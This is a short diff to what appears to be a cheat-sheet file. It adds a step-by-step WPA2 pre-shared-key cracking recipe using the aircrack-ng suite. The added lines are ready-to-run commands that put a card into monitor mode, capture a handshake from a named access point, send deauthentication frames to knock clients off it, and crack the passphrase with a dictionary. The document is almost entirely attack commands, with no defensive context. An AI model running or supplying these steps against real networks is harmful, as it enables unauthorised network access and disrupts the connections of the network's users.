@@ -1,4 +1,16 @@
-﻿WPA PSK attack with aircrack-ng suite.
+﻿WPA2 PSK attack with aircrack-ng suite.
+---------------------------------------
+
+ifconfig wlan1 # check wireless IFace
+sudo airmon-ng check kill  # kill issue causing processes
+sudo airmon-ng start wlan1 # start monitor mode
+sudo airodump-ng wlan1mon  # start capturing
+sudo airodump-ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan1mon -w output
+sudo aireplay-ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan1mon   # deauthenticate the client
+sudo aircrack-ng output-01.cap dict # crack the passphrase
+
+
+WPA PSK attack with aircrack-ng suite.
 --------------------------------------
 
 Place your wireless card into Monitor Mode
